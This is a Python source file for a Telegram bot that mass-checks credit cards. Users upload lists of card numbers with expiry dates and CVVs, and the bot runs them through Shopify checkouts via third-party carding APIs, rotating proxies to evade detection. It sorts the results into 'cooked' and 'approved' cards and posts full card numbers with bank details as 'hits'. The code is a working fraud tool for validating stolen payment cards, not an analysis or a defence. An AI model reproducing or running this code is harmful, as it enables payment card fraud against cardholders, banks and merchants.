import os
import json
import re
import time
import random
import threading
import csv
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3
from telebot import types

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# Helper functions (defined inside handler to avoid external dependencies)
# ============================================================================

def get_flag_emoji(country_code):
    """Convert country code to flag emoji"""
    if not country_code or len(country_code) != 2:
        return "🇺🇳"
    return "".join([chr(ord(c.upper()) + 127397) for c in country_code])

def get_bin_info(card_number):
    """Fetch BIN information from local CSV or antipublic API"""
    clean_cc = re.sub(r'\D', '', str(card_number))
    bin_code = clean_cc[:6]
    # Try local CSV first (if exists)
    BINS_CSV_FILE = 'bins_all.csv'
    if os.path.exists(BINS_CSV_FILE):
        try:
            with open(BINS_CSV_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f)
                next(reader, None)  # skip header
                for row in reader:
                    if len(row) >= 6 and row[0].strip() == bin_code:
                        return {
                            'country_name': row[1].strip(),
                            'country_flag': get_flag_emoji(row[1].strip()),
                            'brand': row[2].strip(),
                            'type': row[3].strip(),
                            'level': row[4].strip(),
                            'bank': row[5].strip()
                        }
        except Exception as e:
            print(f"BIN CSV error: {e}")
    # Fallback to antipublic API
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                'country_name': data.get('country_name', 'Unknown'),
                'country_flag': data.get('country_flag', '🇺🇳'),
                'brand': data.get('brand', 'Unknown'),
                'type': data.get('type', 'Unknown'),
                'level': data.get('level', 'Unknown'),
                'bank': data.get('bank', 'Unknown')
            }
    except:
        pass
    return {
        'country_name': 'Unknown',
        'country_flag': '🇺🇳',
        'bank': 'UNKNOWN',
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN',
        'level': 'UNKNOWN'
    }

def extract_cards_from_text(text):
    """Extract cards in format CC|MM|YYYY|CVV from text"""
    valid_ccs = []
    text = text.replace(',', '\n').replace(';', '\n')
    lines = text.split('\n')
    for line in lines:
        line = line.strip()
        if len(line) < 15:
            continue
        match = re.search(r'(\d{13,19})[|:/\s](\d{1,2})[|:/\s](\d{2,4})[|:/\s](\d{3,4})', line)
        if match:
            cc, mm, yyyy, cvv = match.groups()
            if len(yyyy) == 2:
                yyyy = "20" + yyyy
            mm = mm.zfill(2)
            if 1 <= int(mm) <= 12:
                valid_ccs.append(f"{cc}|{mm}|{yyyy}|{cvv}")
    return list(set(valid_ccs))

def create_progress_bar(processed, total, length=15):
    """Create a text progress bar"""
    if total == 0:
        return ""
    percent = processed / total
    filled_length = int(length * percent)
    return f"<code>{'█' * filled_length}{'░' * (length - filled_length)}</code> {int(percent * 100)}%"

def validate_proxies_strict(proxies, bot, message):
    """Test proxies and return live ones (with error handling for edits)"""
    live_proxies = []
    total = len(proxies)
    status_msg = bot.reply_to(message, f"🛡️ <b>Verifying {total} Proxies...</b>", parse_mode='HTML')
    last_ui_update = time.time()
    checked = 0

    def check(proxy_str):
        try:
            parts = proxy_str.split(':')
            if len(parts) == 2:
                url = f"http://{parts[0]}:{parts[1]}"
            elif len(parts) == 4:
                url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            else:
                return False
            requests.get("http://httpbin.org/ip", proxies={'http': url, 'https': url}, timeout=5)
            return True
        except:
            return False

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check, p): p for p in proxies}
        for future in as_completed(futures):
            checked += 1
            if future.result():
                live_proxies.append(futures[future])
            if time.time() - last_ui_update > 2:
                try:
                    bot.edit_message_text(
                        f"🛡️ <b>Verifying Proxies</b>\n✅ Live: {len(live_proxies)}\n💀 Dead: {checked - len(live_proxies)}\n📊 {checked}/{total}",
                        message.chat.id, status_msg.message_id, parse_mode='HTML'
                    )
                    last_ui_update = time.time()
                except:
                    # Message may have been deleted – ignore
                    pass
    try:
        bot.delete_message(message.chat.id, status_msg.message_id)
    except:
        pass
    return live_proxies

# ============================================================================
# Shopify checker with dual API and fallback
# ============================================================================
def check_site_shopify_direct(site_url, cc, proxy=None):
    import urllib.parse
    import re

    def call_api(api_base):
        try:
            clean_site = site_url.rstrip('/')
            proxy_str = proxy
            api_proxy = ""
            if proxy_str:
                proxy_str = proxy_str.strip()
                parts = proxy_str.split(':')
                if len(parts) == 4:
                    api_proxy = proxy_str
                elif '@' in proxy_str:
                    match = re.match(r'(?:http://)?([^:]+):([^@]+)@([^:]+):(\d+)', proxy_str)
                    if match:
                        user, password, host, port = match.groups()
                        api_proxy = f"{host}:{port}:{user}:{password}"
                elif len(parts) == 2:
                    api_proxy = proxy_str

            encoded_cc = urllib.parse.quote(cc)
            encoded_proxy = urllib.parse.quote(api_proxy) if api_proxy else ""

            if api_base == "mentoschk":
                url = f"http://mentoschk.com/shopify?site={clean_site}&cc={encoded_cc}"
                if encoded_proxy:
                    url += f"&proxy={encoded_proxy}"
            else:  # hqdumps
                api_key = "techshopify"
                url = f"https://hqdumps.com/autoshopify/index.php?key={api_key}&url={clean_site}&cc={encoded_cc}"
                if encoded_proxy:
                    url += f"&proxy={encoded_proxy}"

            session = requests.Session()
            session.verify = False
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            response = session.get(url, headers=headers, timeout=90)

            if response.status_code != 200:
                print(f"[API] {api_base} returned {response.status_code}")
                return None

            data = response.json()
            print(f"[API] {api_base} raw response: {data}")

            if api_base == "mentoschk":
                return {
                    'Response': data.get('Response', 'Unknown'),
                    'Price': str(data.get('Price', '0.00')),
                    'Gateway': data.get('Gateway', 'Shopify API'),
                    'Status': data.get('Status', False)
                }
            else:
                resp_text = data.get('Response', 'Unknown')
                status = False if 'UNABLE' in resp_text.upper() or 'FAILED' in resp_text.upper() else True
                return {
                    'Response': resp_text,
                    'Price': str(data.get('Price', '0.00')),
                    'Gateway': data.get('Gate', 'Shopify API'),
                    'Status': status
                }
        except Exception as e:
            print(f"[API] {api_base} exception: {e}")
            return None

    # Try primary API
    result = call_api("mentoschk")

    # If primary failed (None) OR returned a non‑successful response, try secondary
    if result is None:
        result = call_api("hqdumps")
    else:
        # Quick check if it's already a clear success
        resp_text = result['Response'].upper()
        approved_keywords = ['THANK YOU', 'ORDER PLACED', 'CONFIRMED', 'SUCCESS', 'INSUFFICIENT FUNDS']
        approved_otp_keywords = ['3DS', 'ACTION_REQUIRED', 'OTP_REQUIRED', '3D SECURE']
        if not any(k in resp_text for k in approved_keywords + approved_otp_keywords):
            # Not a success – try secondary
            result2 = call_api("hqdumps")
            if result2 is not None:
                result = result2

    if result is None:
        return {
            'Response': 'Both APIs failed',
            'status': 'ERROR',
            'gateway': 'Shopify API',
            'price': '0.00',
            'message': 'No response from any API'
        }

    response_text = result['Response']
    price = result['Price']
    gateway = result['Gateway']
    status_bool = result['Status']
    response_upper = response_text.upper()

    # Enhanced mapping
    approved_keywords = ['THANK YOU', 'ORDER PLACED', 'CONFIRMED', 'SUCCESS', 'INSUFFICIENT FUNDS', 'INSUFFICIENT_FUNDS']
    approved_otp_keywords = ['3DS', 'ACTION_REQUIRED', 'OTP_REQUIRED', '3D SECURE']
    declined_keywords = ['CARD DECLINED', 'DECLINED', 'EXPIRED_CARD', 'EXPIRED', 'FRAUD', 'SUSPECTED',
                         'INCORRECT CVC', 'INCORRECT_CVC', 'INCORRECT ZIP', 'INCORRECT_ZIP',
                         'INCORRECT NUMBER', 'INCORRECT_NUMBER', 'INVALID NUMBER', 'DO NOT HONOR',
                         'PICKUP', 'LOST CARD', 'STOLEN CARD', 'AMOUNT TOO SMALL', 'AMOUNT_TOO_SMALL']
    extra_declined = ['SUBMIT REJECTED', 'PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT',
                      'PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE',
                      'PAYMENTS_CREDIT_CARD_SESSION_ID']
    error_keywords = ['FAILED TO TOKENIZE CARD', 'SITE DEAD', 'GENERIC_ERROR', 'DEAD/TIMEOUT',
                      'TIMEOUT', 'PROXY', 'UNABLE TO GET PAYMENT TOKEN', 'CART ADD FAILED',
                      'SUBMIT FAILED', 'RECHECK']

    if any(k in response_upper for k in approved_keywords):
        status = 'APPROVED'
    elif any(k in response_upper for k in approved_otp_keywords):
        status = 'APPROVED_OTP'
    elif any(k in response_upper for k in declined_keywords + extra_declined):
        status = 'DECLINED'
    elif any(k in response_upper for k in error_keywords):
        status = 'ERROR'
    else:
        status = 'ERROR' if status_bool is False else 'DECLINED'

    return {
        'Response': response_text,
        'status': status,
        'gateway': gateway,
        'price': price,
        'message': response_text
    }

# ============================================================================
# Main handler setup
# ============================================================================
def setup_complete_handler(
    bot,
    get_filtered_sites_func,
    proxies_data,
    check_site_func,           # we will use our internal one, but allow override
    is_valid_response_func,
    process_response_func,
    update_stats_func,
    save_json_func,
    is_user_allowed_func,
    OWNER_ID,
    DARKS_ID,
    user_proxies_store,
    USER_PROXIES_FILE
):
    """
    Sets up additional handlers:
      - File upload (CCs or proxies)
      - Proxy management commands for users
      - Mass check callbacks with filter selection
    """
    # Use internal Shopify checker unless overridden
    if check_site_func is None:
        check_site_func = check_site_shopify_direct

    # Helper: check if user is allowed
    def user_allowed(uid):
        return uid in OWNER_ID or is_user_allowed_func(uid)

    # ------------------------------------------------------------------------
    # Proxy management commands
    # ------------------------------------------------------------------------
    @bot.message_handler(commands=['addproxy'])
    def cmd_addproxy(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 Access Denied.")
            return
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "Usage: /addproxy ip:port OR ip:port:user:pass")
            return
        proxy = args[1].strip()
        parts = proxy.split(':')
        if len(parts) not in (2, 4):
            bot.reply_to(message, "❌ Invalid format. Use ip:port or ip:port:user:pass")
            return
        uid = str(message.from_user.id)
        if uid not in user_proxies_store:
            user_proxies_store[uid] = []
        if proxy not in user_proxies_store[uid]:
            user_proxies_store[uid].append(proxy)
            save_json_func(USER_PROXIES_FILE, user_proxies_store)
            bot.reply_to(message, f"✅ Proxy added. Total: {len(user_proxies_store[uid])}")
        else:
            bot.reply_to(message, "⚠️ Proxy already in your list.")

    @bot.message_handler(commands=['myproxies'])
    def cmd_myproxies(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 Access Denied.")
            return
        uid = str(message.from_user.id)
        proxies = user_proxies_store.get(uid, [])
        if not proxies:
            bot.reply_to(message, "📭 You have no saved proxies.")
            return
        proxy_list = "\n".join([f"{i+1}. {p}" for i, p in enumerate(proxies)])
        bot.reply_to(message, f"🔌 Your proxies:\n{proxy_list}")

    @bot.message_handler(commands=['clearproxies'])
    def cmd_clearproxies(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 Access Denied.")
            return
        uid = str(message.from_user.id)
        if uid in user_proxies_store and user_proxies_store[uid]:
            user_proxies_store[uid] = []
            save_json_func(USER_PROXIES_FILE, user_proxies_store)
            bot.reply_to(message, "✅ All your proxies cleared.")
        else:
            bot.reply_to(message, "📭 You have no proxies to clear.")

    # ==========================================================================
    # FILE UPLOAD HANDLER
    # ==========================================================================
    @bot.message_handler(content_types=['document'])
    def handle_file_upload_event(message):
        if not user_allowed(message.from_user.id):
            bot.reply_to(message, "🚫 <b>Access Denied:</b> Contact Admin.", parse_mode='HTML')
            return

        try:
            file_name = message.document.file_name.lower()
            if not file_name.endswith('.txt'):
                bot.reply_to(message, "❌ <b>Format Error:</b> Only .txt files.", parse_mode='HTML')
                return

            msg_loading = bot.reply_to(message, "⏳ <b>Reading File...</b>", parse_mode='HTML')

            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')

            ccs = extract_cards_from_text(file_content)

            if ccs:
                if not hasattr(bot, 'user_sessions'):
                    bot.user_sessions = {}
                user_id = message.from_user.id
                bot.user_sessions[user_id] = {'ccs': ccs}

                markup = types.InlineKeyboardMarkup(row_width=1)
                markup.add(
                    types.InlineKeyboardButton("🛍️ Shopify Mass (Multi-Site)", callback_data="run_mass_shopify"),
                    types.InlineKeyboardButton("💳 Stripe Donation (Multi)", callback_data="run_mass_stripe_donation"),
                    types.InlineKeyboardButton("💰 Braintree Auth (bandc)", callback_data="run_mass_braintree_mass"),
                    types.InlineKeyboardButton("🔤 Duolingo Stripe Auth", callback_data="run_mass_duolingo_stripe"),
                    types.InlineKeyboardButton("❌ Cancel", callback_data="action_cancel")
                )

                bot.edit_message_text(
                    f"📂 <b>File:</b> <code>{file_name}</code>\n"
                    f"💳 <b>Cards:</b> {len(ccs)}\n"
                    f"<b>⚡ Select Checking Gate:</b>",
                    message.chat.id, msg_loading.message_id, reply_markup=markup, parse_mode='HTML'
                )
            else:
                proxies = [line.strip() for line in file_content.split('\n') if ':' in line]
                if proxies:
                    user_id = message.from_user.id
                    uid = str(user_id)
                    if uid not in user_proxies_store:
                        user_proxies_store[uid] = []
                    added = 0
                    for p in proxies:
                        if p not in user_proxies_store[uid]:
                            user_proxies_store[uid].append(p)
                            added += 1
                    if added > 0:
                        save_json_func(USER_PROXIES_FILE, user_proxies_store)
                    bot.edit_message_text(
                        f"🔌 <b>Proxies Loaded:</b> {added} new (total {len(user_proxies_store[uid])})\n✅ You can now run Mass Check.",
                        message.chat.id, msg_loading.message_id, parse_mode='HTML'
                    )
                else:
                    bot.edit_message_text("❌ No valid CCs or Proxies found.", message.chat.id, msg_loading.message_id)

        except Exception as e:
            bot.reply_to(message, f"❌ Error: {e}")

    # ==========================================================================
    # Helper: get active proxies for user
    # ==========================================================================
    def get_active_proxies_for_user(user_id, bot, message):
        uid = str(user_id)
        if hasattr(bot, 'user_sessions') and user_id in bot.user_sessions and 'proxies' in bot.user_sessions[user_id]:
            proxy_list = bot.user_sessions[user_id]['proxies']
        else:
            proxy_list = user_proxies_store.get(uid, [])
            if not proxy_list and user_id in OWNER_ID:
                proxy_list = proxies_data.get('proxies', [])

        if not proxy_list:
            bot.send_message(message.chat.id,
                             "🚫 <b>No Proxies Available!</b>\n"
                             "Add proxies via:\n"
                             "• Upload a .txt file\n"
                             "• /addproxy ip:port:user:pass",
                             parse_mode='HTML')
            return None

        live_proxies = validate_proxies_strict(proxy_list, bot, message)
        if not live_proxies:
            bot.send_message(message.chat.id, "❌ <b>All Proxies Dead.</b> Please add more.", parse_mode='HTML')
            return None
        return live_proxies

    # ==========================================================================
    # Improved hit message sender (includes owner mention)
    # ==========================================================================
    def send_hit_improved(bot, chat_id, res, title):
        try:
            cc = res['cc']
            bin_info = get_bin_info(cc)
            site_domain = res['site_url'].replace('https://', '').replace('http://', '').split('/')[0]

            bank_line = f"{bin_info.get('country_flag', '')} {bin_info.get('bank', 'UNKNOWN')}"
            card_line = f"{bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}"

            msg = (
                f"┏━━━━━━━━━━━━━━━━━━━━┓\n"
                f"┃   {title} HIT!\n"
                f"┗━━━━━━━━━━━━━━━━━━━━┛\n"
                f"💳 <b>Card:</b> <code>{cc}</code>\n"
                f"📟 <b>Resp:</b> {res['response']}\n"
                f"💰 <b>Amt:</b> ${res['price']}\n"
                f"🌐 <b>Site:</b> {site_domain}\n"
                f"🔌 <b>Gate:</b> {res['gateway']}\n"
                f"🏦 <b>Bank:</b> {bank_line}\n"
                f"💳 <b>Type:</b> {card_line}\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>Owner:</b> <a href=\"tg://user?id={DARKS_ID}\">⏤‌‌Unknownop ꯭𖠌</a>"
            )
            bot.send_message(chat_id, msg, parse_mode='HTML')
        except Exception as e:
            # Fallback if any formatting fails
            bot.send_message(chat_id, f"{title}\n{res['cc']}\n{res['response']}")

    # ==========================================================================
    # Mass check engine with filter support
    # ==========================================================================
    MAX_RETRIES = 3

    def process_mass_check_engine(bot, message, status_msg, ccs, sites, proxies,
                                  check_site_func, process_response_func, update_stats_func,
                                  hit_filter='both'):
        results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
        total = len(ccs)
        processed = 0
        start_time = time.time()
        last_update_time = time.time()

        def worker(cc):
            attempts = 0
            while attempts < MAX_RETRIES:
                try:
                    site = random.choice(sites)
                    proxy = random.choice(proxies)
                    api_response = check_site_func(site['url'], cc, proxy)

                    if not api_response:
                        attempts += 1
                        continue

                    resp_text, status, gateway = process_response_func(api_response, site.get('price', '0'))

                    if any(x in resp_text.upper() for x in ["PROXY", "TIMEOUT", "CAPTCHA"]):
                        attempts += 1
                        continue

                    return {'cc': cc, 'status': status, 'response': resp_text, 'gateway': gateway,
                            'price': site.get('price', '0'), 'site_url': site['url']}
                except:
                    attempts += 1
            return {'cc': cc, 'status': 'ERROR', 'response': 'Dead/Timeout', 'gateway': 'Unknown',
                    'price': '0', 'site_url': 'N/A'}

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(worker, cc): cc for cc in ccs}
            for future in as_completed(futures):
                processed += 1
                res = future.result()

                if res['status'] == 'APPROVED':
                    if any(x in res['response'].upper() for x in ["THANK", "CONFIRMED", "SUCCESS"]):
                        res['final_status'] = 'COOKED'
                        results['cooked'].append(res)
                        update_stats_func('COOKED', True)
                        if hit_filter in ['cooked', 'both']:
                            send_hit_improved(bot, message.chat.id, res, "🔥 COOKED")
                    else:
                        res['final_status'] = 'APPROVED'
                        results['approved'].append(res)
                        update_stats_func('APPROVED', True)
                        if hit_filter in ['approved', 'both']:
                            send_hit_improved(bot, message.chat.id, res, "✅ APPROVED")
                elif res['status'] == 'APPROVED_OTP':
                    res['final_status'] = 'APPROVED_OTP'
                    results['approved'].append(res)
                    update_stats_func('APPROVED_OTP', True)
                    if hit_filter in ['approved', 'both']:
                        send_hit_improved(bot, message.chat.id, res, "⚠️ APPROVED (OTP)")
                elif res['status'] == 'DECLINED':
                    results['declined'].append(res)
                    update_stats_func('DECLINED', True)
                else:
                    results['error'].append(res)

                if time.time() - last_update_time > 3 or processed == total:
                    update_ui(bot, message.chat.id, status_msg.message_id, processed, total, results)
                    last_update_time = time.time()

        # Save error cards
        error_list = [f"{res['cc']} : {res['response']}" for res in results['error']]
        if error_list:
            error_file = f"error_cards_{message.from_user.id}.txt"
            with open(error_file, 'w') as f:
                f.write("\n".join(error_list))
            with open(error_file, 'rb') as f:
                bot.send_document(message.chat.id, f, caption=f"⚠️ Error cards ({len(error_list)})")
            os.remove(error_file)

        duration = time.time() - start_time
        send_final(bot, message.chat.id, status_msg.message_id, total, results, duration)

    def update_ui(bot, chat_id, mid, processed, total, results):
        try:
            msg = f"""
┏━━━━━━━⍟
┃ <b>⚡ MASS CHECKING...</b>
┗━━━━━━━━━━━⊛
{create_progress_bar(processed, total)}
<b>Progress:</b> {processed}/{total}
🔥 <b>Cooked:</b> {len(results['cooked'])}
✅ <b>Approved:</b> {len(results['approved'])}
❌ <b>Declined:</b> {len(results['declined'])}
⚠️ <b>Errors:</b> {len(results['error'])}
"""
            bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
        except:
            # Message may have been deleted – ignore
            pass

    def send_final(bot, chat_id, mid, total, results, duration):
        msg = f"""
┏━━━━━━━⍟
┃ <b>✅ CHECK COMPLETED</b>
┗━━━━━━━━━━━⊛
🔥 <b>Cooked:</b> {len(results['cooked'])}
✅ <b>Approved:</b> {len(results['approved'])}
❌ <b>Declined:</b> {len(results['declined'])}
<b>Total:</b> {total} | <b>Time:</b> {duration:.2f}s
"""
        try:
            bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
        except:
            # If editing fails, send as new message
            bot.send_message(chat_id, msg, parse_mode='HTML')

    # ==========================================================================
    # Filter selection for Shopify
    # ==========================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_shopify")
    def callback_shopify_filter(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            user_id = call.from_user.id
            if not user_allowed(user_id):
                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
                return
            if not hasattr(bot, 'user_sessions') or user_id not in bot.user_sessions or 'ccs' not in bot.user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = get_active_proxies_for_user(user_id, bot, call.message)
            if proxies is None:
                return

            if not hasattr(bot, 'user_sessions'):
                bot.user_sessions = {}
            if user_id not in bot.user_sessions:
                bot.user_sessions[user_id] = {}
            bot.user_sessions[user_id]['temp_proxies'] = proxies

            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("🔥 Cooked Only", callback_data="shopify_filter_cooked"),
                types.InlineKeyboardButton("✅ Approved Only", callback_data="shopify_filter_approved"),
                types.InlineKeyboardButton("Both", callback_data="shopify_filter_both")
            )
            bot.send_message(
                call.message.chat.id,
                "🔍 <b>Select which hits to display:</b>",
                reply_markup=markup,
                parse_mode='HTML'
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    @bot.callback_query_handler(func=lambda call: call.data.startswith("shopify_filter_"))
    def callback_start_shopify_mass(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            filter_choice = call.data.replace("shopify_filter_", "")
            user_id = call.from_user.id

            if not user_allowed(user_id):
                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
                return
            if not hasattr(bot, 'user_sessions') or user_id not in bot.user_sessions or 'ccs' not in bot.user_sessions[user_id]:
                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                return

            proxies = bot.user_sessions[user_id].get('temp_proxies')
            if not proxies:
                bot.send_message(call.message.chat.id, "🚫 Proxies missing. Please restart.")
                return

            del bot.user_sessions[user_id]['temp_proxies']

            start_msg = bot.send_message(
                call.message.chat.id,
                f"🔥 <b>Shopify Mass Check Started...</b>\n"
                f"💳 Cards: {len(bot.user_sessions[user_id]['ccs'])}\n"
                f"🔌 Proxies: {len(proxies)}\n"
                f"🎯 Filter: {filter_choice.upper()}",
                parse_mode='HTML'
            )

            process_mass_check_engine(
                bot, call.message, start_msg,
                bot.user_sessions[user_id]['ccs'],
                get_filtered_sites_func(),
                proxies,
                check_site_func,
                process_response_func,
                update_stats_func,
                hit_filter=filter_choice
            )
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    # ==========================================================================
    # Other mass check callbacks (placeholders – extend as needed)
    # ==========================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_stripe_donation")
    def callback_stripe_donation(call):
        bot.answer_callback_query(call.id, "Stripe donation mass check not yet implemented.", show_alert=True)

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_braintree_mass")
    def callback_braintree_mass(call):
        bot.answer_callback_query(call.id, "Braintree mass check not yet implemented.", show_alert=True)

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_duolingo_stripe")
    def callback_duolingo_stripe(call):
        bot.answer_callback_query(call.id, "Duolingo mass check not yet implemented.", show_alert=True)

    @bot.callback_query_handler(func=lambda call: call.data == "action_cancel")
    def callback_cancel(call):
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(call.message.chat.id, "❌ Operation cancelled.")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"❌ Error: {e}")

    return
